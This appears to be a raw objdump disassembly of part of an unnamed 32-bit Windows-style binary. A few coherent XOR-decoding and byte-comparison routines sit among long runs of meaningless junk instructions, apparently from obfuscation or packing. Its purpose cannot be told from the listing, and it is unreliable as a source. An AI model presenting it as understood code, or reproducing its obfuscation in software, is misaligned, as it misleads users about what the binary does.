  40498c:	add    eax,0x433b5411
  404991:	hlt    
  404992:	or     edx,ecx
  404994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404995:	push   eax
  404996:	stos   DWORD PTR es:[edi],eax
  404997:	inc    ebx
  404998:	fwait
  404999:	sub    edx,DWORD PTR [edi-0x45]
  40499c:	push   esp
  40499d:	and    BYTE PTR [ebx-0x1e],0x9
  4049a1:	and    dl,cl
  4049a3:	sbb    BYTE PTR [edi+0x5e],bl
  4049a6:	pop    es
  4049a7:	(bad)  
  4049a8:	fsubr  QWORD PTR [edi-0x16b57c64]
  4049ae:	cwde   
  4049af:	inc    ebx
  4049b0:	push   edi
  4049b1:	test   edx,ebx
  4049b3:	mov    edi,0x1b4f9bf0
  4049b8:	mov    ch,0x15
  4049ba:	iret   
  4049bb:	push   ebx
  4049bc:	sbb    al,0xda
  4049be:	div    BYTE PTR [ecx+0x694bd6e7]
  4049c4:	scas   eax,DWORD PTR es:[edi]
  4049c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049c6:	lea    esp,[ebx+0x3ad7cf16]
  4049cc:	in     eax,dx
  4049cd:	and    DWORD PTR [ebx],eax
  4049cf:	loopne 0x4049a4
  4049d1:	cld    
  4049d2:	pop    ebx
  4049d3:	xor    al,0x2d
  4049d5:	(bad)  
  4049d6:	lods   al,BYTE PTR ds:[esi]
  4049d7:	inc    ecx
  4049d8:	mov    edx,0xc0a54f6e
  4049dd:	mov    edi,0x7d8b5703
  4049e2:	or     BYTE PTR [ecx],bl
  4049e4:	sbb    eax,0x43371b
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4336b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433653
  404a04:	sbb    DWORD PTR ds:0x4336f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433723,0x4336f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433733,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx+0x74]
  404a70:	les    ebp,FWORD PTR [ebp-0x6]
  404a73:	test   BYTE PTR ds:0x7fab7c7c,ch
  404a79:	jl     0x404af7
  404a7b:	inc    ecx
  404a7c:	lahf   
  404a7d:	jg     0x404aef
  404a7f:	dec    edx
  404a80:	sbb    ah,BYTE PTR [esi]
  404a82:	shr    esi,1
  404a84:	outs   dx,BYTE PTR ds:[esi]
  404a85:	(bad)  
  404a86:	mov    ds:0xbf50d392,al
  404a8b:	ins    BYTE PTR es:[edi],dx
  404a8c:	loop   0x404ae2
  404a8e:	xor    eax,0xaf8552e4
  404a93:	cmp    ebp,ebx
  404a95:	mov    ah,dh
  404a97:	sub    BYTE PTR [esi],ah
  404a99:	mov    cl,al
  404a9b:	push   ss
  404a9c:	xchg   ebx,eax
  404a9d:	jle    0x404ac6
  404a9f:	mov    eax,ds:0x3934e2fc
  404aa4:	add    esp,eax
  404aa6:	inc    ecx
  404aa7:	mov    edi,0xcdcb1a86
  404aac:	push   edi
  404aad:	je     0x404a5f
  404aaf:	fcmovne st,st(6)
  404ab1:	add    BYTE PTR [esi],ch
  404ab3:	sti    
  404ab4:	fst    DWORD PTR [eax+ebx*1+0x59994b85]
  404abb:	dec    ebp
  404abc:	pop    edi
  404abd:	mov    bl,0xd7
  404abf:	(bad)  ds:0x584df771
  404ac5:	inc    edx
  404ac6:	sub    eax,0xe82af77c
  404acb:	mov    edi,0x6dce8db2
  404ad0:	pop    ebx
  404ad1:	sub    eax,0x5dd47cda
  404ad6:	fs jmp 0x47ba:0xa03e1f58
  404ade:	aas    
  404adf:	mov    cl,0x94
  404ae1:	pop    ecx
  404ae2:	push   esp
  404ae3:	out    dx,eax
  404ae4:	xchg   esp,eax
  404ae5:	mov    eax,0x79d5816a
  404aea:	aaa    
  404aeb:	or     esp,DWORD PTR [ebx+ecx*8-0x1bb1066e]
  404af2:	jo     0x404ae6
  404af4:	inc    edx
  404af5:	(bad)  
  404af7:	loop   0x404abd
  404af9:	cdq    
  404afa:	loope  0x404b70
  404afc:	das    
  404afd:	retf   0x1f1f
  404b00:	add    dl,BYTE PTR [ecx-0x5bf8524a]
  404b06:	mov    ecx,ebx
  404b08:	ficom  DWORD PTR [ebx]
  404b0a:	inc    edx
  404b0b:	ret    
  404b0c:	fwait
  404b0d:	imul   ebp,DWORD PTR [esi-0x14d319f9],0xbd68164c
  404b17:	mov    eax,ds:0xd1134f8
  404b1c:	jg     0x404b13
  404b1e:	aas    
  404b1f:	ret    0x5c56
  404b22:	sbb    eax,0xfc1e3c40
  404b27:	lods   eax,DWORD PTR ds:[esi]
  404b28:	and    eax,0x76dfc3df
  404b2d:	imul   DWORD PTR [eax+0x32]
  404b30:	cmp    ch,BYTE PTR [eax]
  404b32:	cld    
  404b33:	mov    ebx,0x42bfd72
  404b38:	call   0xf6c2:0x7aa94a6
  404b3f:	adc    dl,cl
  404b41:	aas    
  404b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b43:	pop    eax
  404b44:	dec    esi
  404b45:	daa    
  404b46:	data16 fs rcr ah,0x9c
  404b4b:	adc    bl,BYTE PTR [ecx-0x7f]
  404b4e:	pusha  
  404b4f:	add    ecx,DWORD PTR ds:0x6c09da95
  404b55:	pop    esp
  404b56:	loopne 0x404ae0
  404b58:	shl    dl,cl
  404b5a:	mov    DWORD PTR [edi-0x270189c4],ecx
  404b60:	pop    edx
  404b61:	cs xchg ebp,eax
  404b63:	mov    ds:0x2e83cf14,al
  404b68:	xchg   esi,eax
  404b69:	clc    
  404b6a:	xor    eax,0x4616b6a7
  404b6f:	shl    BYTE PTR [esi+0x3449e8d],cl
  404b75:	std    
  404b76:	out    dx,eax
  404b77:	les    edi,FWORD PTR [ebx-0x22d1ff25]
  404b7d:	fcomp  st(5)
  404b7f:	add    dh,BYTE PTR [edi+edx*2+0x68]
  404b83:	cmp    BYTE PTR [ecx+0x4712135d],bl
  404b89:	dec    ecx
  404b8a:	ret    
  404b8b:	xchg   ebx,eax
  404b8c:	jmp    0xd7bb:0x407664b8
  404b93:	jmp    0xfcf00875
  404b98:	adc    al,0x67
  404b9a:	mov    ah,0xe1
  404b9c:	in     al,dx
  404b9d:	xor    al,bh
  404b9f:	add    al,0xda
  404ba1:	retf   0xddb3
  404ba4:	lods   al,BYTE PTR ds:[esi]
  404ba5:	mov    dh,ah
  404ba7:	shr    BYTE PTR [esi+esi*8+0x15],1
  404bab:	frstor [edx+0x38e3785]
  404bb1:	dec    ebx
  404bb2:	push   eax
  404bb3:	dec    ebx
  404bb4:	xchg   ebx,eax
  404bb5:	or     eax,DWORD PTR [edi+0x16]
  404bb8:	push   esi
  404bb9:	pop    ecx
  404bba:	rcr    eax,0xf
  404bbd:	scas   eax,DWORD PTR es:[edi]
  404bbe:	popa   
  404bbf:	push   ds
  404bc0:	xchg   edi,eax
  404bc1:	dec    ebx
  404bc2:	int    0x15
  404bc4:	mov    ebx,0xa11f3d46
  404bc9:	jns    0x404c1d
  404bcb:	pop    esp
  404bcc:	enter  0x5896,0x9d
  404bd0:	(bad)  
  404bd1:	push   cs
  404bd2:	retf   0x582f
  404bd5:	popf   
  404bd6:	loop   0x404b6b
  404bd8:	rol    BYTE PTR [ebp-0x4],1
  404bdb:	and    BYTE PTR [ebx-0x7c],ah
  404bde:	imul   edx,DWORD PTR [edi],0xffffff8d
  404be1:	leave  
  404be2:	loope  0x404c46
  404be4:	dec    esi
  404be5:	push   0x12
  404be7:	mov    edx,DWORD PTR [ebx+0x69f0e77a]
  404bed:	pusha  
  404bee:	sahf   
  404bef:	cdq    
  404bf0:	arpl   WORD PTR [ebp-0x5df26920],dx
  404bf6:	out    0x96,al
  404bf8:	retf   0xe9c2
  404bfb:	xchg   BYTE PTR [edx+0x38],ch
  404bfe:	dec    esi
  404bff:	push   ecx
  404c00:	hlt    
  404c01:	nop
  404c02:	add    dl,bl
  404c04:	(bad)
  404c08:	(bad)
  404c0c:	and    esi,DWORD PTR [esi+eiz*8+0x77]
  404c10:	jl     0x404c38
  404c12:	popa   
  404c13:	push   esp
  404c14:	repnz adc BYTE PTR [esi],0x2c
  404c18:	inc    edi
  404c19:	pushf  
  404c1a:	ss aam 0x3
  404c1d:	and    al,0x1c
  404c1f:	mov    DWORD PTR ds:0x958397d0,ebp
  404c25:	out    0x52,al
  404c27:	imul   edx,DWORD PTR [ebx-0x579eab76],0xffffff80
  404c2e:	or     eax,0x3c13391
  404c33:	(bad)  
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	aam    0x51
  404c5f:	test   eax,0x7c2f33d3
  404c64:	jl     0x404c11
  404c66:	jg     0x404ce4
  404c68:	jl     0x404c29
  404c6a:	jl     0x404c28
  404c6c:	xor    al,0xff
  404c6e:	push   ebx
  404c6f:	inc    esi
  404c70:	pop    esi
  404c71:	inc    esi
  404c72:	mov    al,ds:0xabf50d61
  404c77:	call   0x6eb7fa30
  404c7c:	mov    ecx,0x80af4768
  404c81:	popa   
  404c82:	xor    edi,DWORD PTR [ecx+0x79fc0618]
  404c88:	pop    ebx
  404c89:	mov    edx,0x57a4cacf
  404c8e:	call   0x1536fb65
  404c93:	mov    bl,0x2e
  404c95:	fistp  WORD PTR [esi-0x39]
  404c98:	dec    ecx
  404c99:	and    al,0x81
  404c9b:	push   esi
  404c9c:	sub    eax,0x4bab9402
  404ca1:	xchg   edx,eax
  404ca2:	and    cl,BYTE PTR [edx+0x55ee79fc]
  404ca8:	dec    edi
  404ca9:	or     eax,0xc65c04ec
  404cae:	clc    
  404caf:	push   ebx
  404cb0:	lds    ebx,FWORD PTR [ebx]
  404cb2:	mov    ah,0x8c
  404cb4:	sub    BYTE PTR [edx],ah
  404cb6:	jbe    0x404d07
  404cb8:	xchg   esp,eax
  404cb9:	loope  0x404cf2
  404cbb:	out    0x69,al
  404cbd:	in     eax,dx
  404cbe:	cmp    eax,DWORD PTR [ecx-0x5d]
  404cc1:	pop    es
  404cc2:	cmp    ax,0x1cdb
  404cc6:	shl    DWORD PTR [eax-0x5e38d27f],0x43
  404ccd:	fistp  QWORD PTR [edi+0x1fc5cf12]
  404cd3:	lahf   
  404cd4:	and    al,0xf2
  404cd6:	dec    ebp
  404cd7:	nop
  404cd8:	xchg   BYTE PTR [esp+edx*2-0x11ee77ef],al
  404cdf:	mov    al,0xe9
  404ce1:	scas   al,BYTE PTR es:[edi]
  404ce2:	cmp    ebx,esi
  404ce4:	cli    
  404ce5:	enter  0x9c9b,0x43
  404ce9:	fmul   QWORD PTR ds:0xfb31b572
  404cef:	push   ecx
  404cf0:	aas    
  404cf1:	jg     0x404d2a
  404cf3:	dec    esi
  404cf4:	enter  0x9a62,0xfc
  404cf8:	mov    bh,0xbc
  404cfa:	dec    edx
  404cfb:	test   BYTE PTR [edx-0x547bee10],dh
  404d01:	test   ah,0x63
  404d04:	outs   dx,BYTE PTR ds:[esi]
  404d05:	mov    dl,0x90
  404d07:	aaa    
  404d08:	pop    ds
  404d09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d0a:	mov    BYTE PTR ds:0xf7a4899,bh
  404d10:	int    0x3e
  404d12:	mov    edi,0xc981b053
  404d17:	cmp    edx,DWORD PTR [eax]
  404d19:	xchg   DWORD PTR [esi+0x2c],esp
  404d1c:	lods   eax,DWORD PTR ds:[esi]
  404d1d:	retf   
  404d1e:	ins    BYTE PTR es:[edi],dx
  404d1f:	or     DWORD PTR [ebx],0xeccc9758
  404d25:	jmp    0x1329a535
  404d2a:	icebp  
  404d2b:	jne    0x404d1f
  404d2d:	adc    cl,BYTE PTR [edi+0x270d34d4]
  404d33:	clc    
  404d34:	push   DWORD PTR [ecx+0x18]
  404d37:	push   cs
  404d38:	xchg   ecx,eax
  404d39:	daa    
  404d3a:	in     al,0x30
  404d3c:	fdivr  QWORD PTR [eax+ebx*4]
  404d3f:	das    
  404d40:	mov    bh,0xe8
  404d43:	or     al,0xbc
  404d45:	rol    DWORD PTR [edx+0xeef347a],cl
  404d4b:	outs   dx,BYTE PTR cs:[esi]
  404d4d:	(bad)  
  404d4f:	sbb    edi,edx
  404d51:	sbb    eax,0x2dd55a2d
  404d56:	xchg   edi,eax
  404d57:	fadd   st,st(6)
  404d59:	xor    eax,0x3babd24f
  404d5e:	or     DWORD PTR [edx+ebp*4-0x30],ecx
  404d62:	xchg   ecx,eax
  404d63:	out    0x17,eax
  404d65:	push   ebp
  404d66:	xor    dh,bh
  404d68:	pop    ebp
  404d69:	jo     0x404da8
  404d6b:	mov    eax,ds:0xa45e154a
  404d70:	sbb    BYTE PTR [ecx+esi*2+0x2a],0xfd
  404d75:	xchg   edi,eax
  404d76:	push   esp
  404d77:	pop    es
  404d78:	dec    edx
  404d79:	add    BYTE PTR [eax-0x10f2df2],dh
  404d7f:	and    bl,BYTE PTR [edi+ecx*2-0x1ad4912e]
  404d86:	lock and eax,0xb8a52d36
  404d8c:	lea    esp,[ebp-0x4f]
  404d8f:	jle    0x404d42
  404d91:	push   0x66
  404d93:	mov    dh,0x4d
  404d95:	jmp    0x476dc20a
  404d9a:	xor    al,0xb
  404d9c:	jns    0x404d93
  404d9e:	pushf  
  404d9f:	aas    
  404da0:	jge    0x404d52
  404da2:	lahf   
  404da3:	call   0x1953:0xe288f184
  404daa:	sbb    eax,DWORD PTR [esi+0x7316c29a]
  404db0:	push   ebx
  404db1:	fstp   st(2)
  404db3:	(bad)  
  404db4:	push   ss
  404db5:	lods   al,BYTE PTR ds:[esi]
  404db6:	xor    ecx,DWORD PTR [ebp+0x5f4c8951]
  404dbc:	xchg   edi,esi
  404dbe:	stos   DWORD PTR es:[edi],eax
  404dbf:	cmc    
  404dc0:	inc    esi
  404dc1:	loop   0x404dab
  404dc3:	in     eax,0x6a
  404dc5:	aam    0xac
  404dc7:	pop    eax
  404dc8:	dec    eax
  404dc9:	cdq    
  404dca:	fstp   TBYTE PTR [edi+0x4b]
  404dcd:	stos   BYTE PTR es:[edi],al
  404dce:	adc    BYTE PTR [edx+0x32],0xea
  404dd2:	shl    DWORD PTR [esp+eiz*2],1
  404dd5:	(bad)  
  404dd6:	es jnp 0x404dda
  404dd9:	addr16 mov al,es:0xcdb6
  404dde:	hlt    
  404ddf:	jno    0x404dd3
  404de1:	jmp    0x404e25
  404de3:	xchg   ebp,eax
  404de4:	cmp    bh,dh
  404de6:	sub    eax,0xf45c51f1
  404deb:	cmp    eax,0x51c8aa9c
  404df0:	enter  0x3b09,0x67
  404df4:	popf   
  404df5:	xor    BYTE PTR [ebx+ebp*4],dh
  404df8:	sub    dl,BYTE PTR [ebx-0x42036076]
  404dfe:	sbb    edi,ebp
  404e00:	pop    edx
  404e01:	test   eax,0x6ff51c2d
  404e06:	loop   0x404e47
  404e08:	aaa    
  404e09:	sub    bl,BYTE PTR [edx+0x16]
  404e0c:	mov    ah,BYTE PTR [eax+0x67]
  404e0f:	xor    al,0xe9
  404e11:	add    ah,dl
  404e13:	aam    0x4
  404e15:	or     eax,0xcfba0833
  404e1a:	aad    0xbf
  404e1c:	aad    0x79
  404e1e:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404e22:	mov    edx,DWORD PTR [ebp+0xc]
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0xe76a1b8f
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e6e
  404e56:	xchg   ecx,eax
  404e57:	add    bl,BYTE PTR [edx]
  404e59:	stos   DWORD PTR es:[edi],eax
  404e5a:	push   edi
  404e5b:	outs   dx,BYTE PTR ds:[esi]
  404e5c:	hlt    
  404e5d:	loop   0x404e74
  404e5f:	cli    
  404e60:	cmp    dh,BYTE PTR [esi]
  404e62:	es adc dl,ah
  404e65:	dec    edi
  404e66:	hlt    
  404e67:	push   ecx
  404e68:	or     DWORD PTR [edx-0x24a7f050],0xffffffed
  404e6f:	mov    edx,0xa0437df3
  404e74:	lods   al,BYTE PTR ds:[esi]
  404e75:	ret    
  404e76:	mov    ecx,0xda007d7c
  404e7b:	out    0x12,al
  404e7d:	jb     0x404e29
  404e7f:	out    0x54,eax
  404e81:	mov    ds:0x15c2095,eax
  404e86:	push   cs
  404e87:	lea    ebx,[ebx-0x1d90dc5c]
  404e8d:	fwait
  404e8e:	dec    esi
  404e8f:	jbe    0x404ef0
  404e91:	mov    edi,0xf6d1a298
  404e96:	outs   dx,BYTE PTR ds:[esi]
  404e97:	jne    0x404e64
  404e99:	lods   al,BYTE PTR ds:[esi]
  404e9a:	bound  esp,QWORD PTR [esi+ebp*4-0x2f0a2c5b]
  404ea1:	inc    esp
  404ea2:	mov    dh,0x8b
  404ea4:	scas   al,BYTE PTR es:[edi]
  404ea5:	imul   edx,DWORD PTR [ecx+0x71103e42],0xc195229a
  404eaf:	inc    edi
  404eb0:	jnp    0x404e7b
  404eb2:	mov    ch,BYTE PTR [ebx]
  404eb4:	inc    esi
  404eb5:	fild   QWORD PTR [edi-0x2b]
  404eb8:	pop    eax
  404eb9:	dec    ecx
  404eba:	inc    esp
  404ebb:	or     dh,dh
  404ebd:	aaa    
  404ebe:	xchg   ebp,eax
  404ebf:	sti    
  404ec0:	push   ebp
  404ec1:	xor    edi,ebp
  404ec3:	shl    DWORD PTR [edx+0x22],cl
  404ec6:	jns    0x404e8e
  404ec8:	out    0x52,al
  404eca:	mov    ebp,0x13a1ca64
  404ecf:	cs je  0x404f27
  404ed2:	or     dl,BYTE PTR [edi]
  404ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ed5:	dec    ebx
  404ed6:	js     0x404ecc
  404ed8:	stos   DWORD PTR es:[edi],eax
  404ed9:	jb     0x404f00
  404edb:	sbb    al,BYTE PTR [esi+0x4b]
  404ede:	iret   
  404edf:	xor    eax,0xc82bc46a
  404ee4:	xor    eax,0x26fad23c
  404ee9:	aaa    
  404eea:	rol    ch,0x8d
  404eed:	xor    ecx,DWORD PTR [ebp+0x4cbbad16]
  404ef3:	test   DWORD PTR [eax-0x77],ebx
  404ef6:	push   edx
  404ef7:	scas   eax,DWORD PTR es:[edi]
  404ef8:	adc    ah,BYTE PTR [ecx+0x2]
  404efb:	or     esi,edi
  404efd:	aaa    
  404efe:	jmp    0xecc2:0xf1149227
  404f05:	mov    eax,0x6fa4b78d
  404f0a:	cmp    BYTE PTR [esi+0x5966964],cl
  404f10:	int    0x81
  404f12:	es mov edi,0xe7b1b005
  404f18:	call   0xf4a3:0x1a4af050
  404f1f:	lock or BYTE PTR [eax],ch
  404f22:	sbb    al,0x3f
  404f24:	out    dx,eax
  404f25:	ja     0x404edf
  404f27:	jae    0x404f56
  404f29:	fadd   QWORD PTR [ecx+0x2e484377]
  404f2f:	les    ebp,FWORD PTR [ebp+0x60e698ea]
  404f35:	pop    ecx
  404f36:	cli    
  404f37:	cwde   
  404f38:	mov    WORD PTR [ecx+0x7f8c1dbd],ds
  404f3e:	in     al,0xac
  404f40:	cmp    DWORD PTR [ecx-0x38228863],0x98e23e9b
  404f4a:	fwait
  404f4b:	sar    BYTE PTR [ecx-0x42],0xba
  404f4f:	mov    bh,0xb
  404f51:	push   es
  404f52:	aaa    
  404f53:	pop    esp
  404f54:	adc    DWORD PTR [ecx],edx
  404f56:	xor    eax,0xaec02083
  404f5b:	loop   0x404f02
  404f5d:	bound  eax,QWORD PTR [ecx+ebp*8]
  404f60:	jns    0x404f94
  404f62:	mov    al,ds:0xeb7a82af
  404f67:	xchg   ebp,eax
  404f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f69:	pop    edi
  404f6a:	sbb    edi,eax
  404f6c:	rcl    BYTE PTR [eax+0x132729b9],1
  404f72:	adc    DWORD PTR [ebx-0x736fdb96],ebx
  404f78:	ja     0x404f6f
  404f7a:	sub    cl,BYTE PTR [eax-0x78756af2]
  404f80:	or     esp,ecx
  404f82:	push   ecx
  404f83:	xchg   esp,eax
  404f84:	sub    dh,BYTE PTR [ebx]
  404f86:	inc    ecx
  404f87:	lods   al,BYTE PTR ds:[esi]
  404f88:	dec    edi
  404f89:	in     eax,dx
  404f8a:	arpl   WORD PTR ds:[ebp+0x47717f3c],bx
  404f91:	outs   dx,BYTE PTR ds:[esi]
  404f92:	mov    eax,0xcf324f00
  404f97:	stc    
  404f98:	lock sahf 
  404f9a:	and    eax,0xab02cb1d
  404f9f:	mov    edi,0xa363d270
  404fa4:	sub    bh,0xf5
  404fa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fa8:	push   eax
  404fa9:	dec    edx
  404faa:	mov    al,0xc8
  404fac:	dec    eax
  404fad:	jbe    0x405012
  404faf:	ds mov edx,0xddadcf32
  404fb5:	dec    esp
  404fb6:	push   ds
  404fb7:	jo     0x40500d
  404fb9:	and    BYTE PTR [esi+edx*8-0x19a6d164],al
  404fc0:	xchg   edx,eax
  404fc1:	xchg   esi,eax
  404fc2:	xlat   BYTE PTR ds:[ebx]
  404fc3:	push   edx
  404fc4:	jg     0x404f6f
  404fc6:	(bad)  
  404fc7:	jecxz  0x404f98
  404fc9:	mov    al,ds:0x57987382
  404fce:	in     al,dx
  404fcf:	mov    ebp,0xbf8e1c59
  404fd4:	in     eax,0x50
  404fd6:	dec    esi
  404fd7:	lods   al,BYTE PTR ds:[esi]
  404fd8:	adc    ebp,DWORD PTR [edx]
  404fda:	and    eax,0x9815e7f8
  404fdf:	cmp    edi,DWORD PTR [ecx+0x6354c1e]
  404fe5:	add    DWORD PTR [eax+0x5],edx
  404fe8:	inc    edx
  404fe9:	les    esi,FWORD PTR [eax]
  404feb:	jb     0x40501f
  404fed:	pop    es
  404fee:	ins    DWORD PTR es:[edi],dx
  404fef:	fist   WORD PTR [edx-0x49]
  404ff2:	adc    DWORD PTR [eax-0x5],edi
  404ff5:	dec    edi
  404ff6:	mov    DWORD PTR [edx+0x7b2fc8f6],edx
  404ffc:	scas   eax,DWORD PTR es:[edi]
  404ffd:	fist   DWORD PTR [edx]
  404fff:	test   al,0x4d
  405001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405002:	ret    
  405003:	mov    edi,0xf7aeb4ee
  405008:	fiadd  WORD PTR [ecx+0x3]
  40500b:	(bad)  
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	ret    0xb152
  405046:	(bad)  
  405047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405048:	sub    BYTE PTR [esp+edi*2-0x55],bh
  40504c:	jg     0x4050ca
  40504e:	jl     0x4050b8
  405050:	(bad)  
  405051:	cwde   
  405052:	cmp    al,0xf
  405054:	ja     0x4050a7
  405056:	xor    al,0x7a
  405058:	fsub   DWORD PTR [ebx]
  40505a:	retf   0x90e1
  40505d:	and    cl,BYTE PTR [ebp+0x4c]
  405060:	iret   
  405061:	jg     0x4050a9
  405063:	mov    bh,0x11
  405065:	ss inc edi
  405067:	xor    esi,DWORD PTR [ebp+0x3c0de3c5]
  40506d:	repz xchg edx,eax
  40506f:	mov    ax,0x34d0
  405073:	mov    esp,0x6f34b8ef
  405078:	daa    
  405079:	hlt    
  40507a:	aas    
  40507b:	je     0x4050cb
  40507d:	or     dl,BYTE PTR [edx]
  40507f:	cmp    eax,0x5e1bcce7
  405084:	(bad)  
  405086:	and    DWORD PTR [ecx+edi*1+0x4e5d1148],edi
  40508d:	mov    DWORD PTR [eax+eiz*1],ecx
  405090:	outs   dx,BYTE PTR ds:[esi]
  405091:	mov    bh,0x6b
  405093:	lahf   
  405094:	push   cs
  405095:	popf   
  405096:	mov    cl,0x1f
  405098:	sbb    DWORD PTR [esp+eiz*2-0x471923cb],esi
  40509f:	pushf  
  4050a0:	or     al,0xc3
  4050a2:	sbb    edx,esi
  4050a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050a5:	push   eax
  4050a6:	cmp    al,BYTE PTR [edx]
  4050a8:	add    ebx,DWORD PTR [esi-0x22ce063]
  4050ae:	in     al,0x53
  4050b0:	rcr    DWORD PTR [ebx],0xff
  4050b3:	outs   dx,DWORD PTR ds:[esi]
  4050b4:	daa    
  4050b5:	pop    eax
  4050b6:	xchg   edx,eax
  4050b7:	add    cl,dh
  4050b9:	call   0xea44bce1
  4050be:	ror    BYTE PTR [edx-0xa41bb2d],0x62
  4050c5:	xor    ah,BYTE PTR ds:0x6d7703a8
  4050cb:	rcl    DWORD PTR [edi-0x49c214e0],cl
  4050d1:	pop    ss
  4050d2:	repnz pop esi
  4050d4:	sysret 
  4050d6:	dec    edi
  4050d7:	pop    ebx
  4050d8:	push   ebp
  4050d9:	in     al,0x61
  4050db:	pusha  
  4050dc:	pop    ss
  4050dd:	xchg   ebp,eax
  4050de:	or     eax,DWORD PTR [edx]
  4050e0:	ss sub eax,0x3c34c151
  4050e6:	mov    ah,0xde
  4050e8:	test   DWORD PTR [ebx-0x7806ece3],edi
  4050ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ef:	mov    dh,0x24
  4050f1:	repz js 0x4050a1
  4050f4:	call   0x3895:0x634b42af
  4050fb:	xor    DWORD PTR [edx-0x7801bfb2],esp
  405101:	add    ecx,DWORD PTR [eax-0x4fdb8e4f]
  405107:	mov    edx,DWORD PTR [ebx-0x3]
  40510a:	cs inc edi
  40510c:	jns    0x40516d
  40510e:	clc    
  40510f:	pushf  
  405110:	stos   DWORD PTR es:[edi],eax
  405111:	sbb    edi,DWORD PTR [ecx]
  405113:	ror    esi,0xab
  405116:	les    esp,FWORD PTR [ecx]
  405118:	mov    al,0x2d
  40511a:	push   ds
  40511b:	popf   
  40511c:	addr16 pusha 
  40511e:	gs mov ecx,0x81c7cea8
  405124:	loopne 0x405128
  405126:	sbb    al,0xcf
  405128:	imul   eax,DWORD PTR [ebp-0x58],0xaf6efc79
  40512f:	inc    eax
  405130:	add    dl,BYTE PTR [ecx-0x69519ed2]
  405136:	mov    WORD PTR [edx],gs
  405138:	jbe    0x4050d1
  40513a:	push   ebp
  40513b:	(bad)  
  40513c:	or     BYTE PTR [eax-0x536926ef],cl
  405142:	outs   dx,DWORD PTR ds:[esi]
  405143:	pop    ss
  405144:	(bad)  
  405145:	fisubr WORD PTR [edx+eiz*2-0x32]
  405149:	push   esi
  40514a:	xchg   ecx,eax
  40514b:	neg    BYTE PTR [edx+0x5]
  40514e:	stos   DWORD PTR es:[edi],eax
  40514f:	cwde   
  405150:	loopne 0x405105
  405152:	push   esp
  405153:	repz mov ebp,0x730fbb5a
  405159:	cld    
  40515a:	sub    al,BYTE PTR ds:0x2a7b1c92
  405160:	hlt    
  405161:	and    dl,cl
  405163:	inc    edi
  405164:	ins    DWORD PTR es:[edi],dx
  405165:	ins    BYTE PTR es:[edi],dx
  405166:	daa    
  405167:	fs inc ecx
  405169:	cmp    eax,0x772054c9
  40516e:	mov    ah,0x7c
  405170:	ss icebp 
